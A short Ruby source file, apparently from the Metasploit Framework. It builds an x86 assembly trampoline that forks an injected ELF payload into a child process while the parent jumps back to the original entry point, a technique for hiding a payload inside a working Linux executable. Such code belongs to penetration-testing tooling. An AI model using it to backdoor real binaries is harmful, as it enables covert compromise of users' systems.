# frozen_string_literal: true

module Msf
  module Exe
    class ElfInjector
      # Builds an x86 trampoline that forks before running the payload.
      class X86
        ASSEMBLY = %q{
          pushfd
          pushad
          mov eax, 2
          int 0x80
          test eax, eax
          jz child
          popad
          popfd
          jmp entrypoint
        child:
          popad
          popfd
        }

        # @param entrypoint [Integer] Original ELF entry point.
        # @param injected_address [Integer] Virtual address of the injected segment.
        def initialize(entrypoint:, injected_address:)
          @entrypoint = entrypoint
          @injected_address = injected_address
        end

        # @return [String] Encoded x86 trampoline.
        def generate
          shellcode = Metasm::Shellcode.assemble(Metasm::Ia32.new, ASSEMBLY)
          shellcode.base_addr = @injected_address
          shellcode.encode_string('entrypoint' => @entrypoint)
        end
      end
    end
  end
end
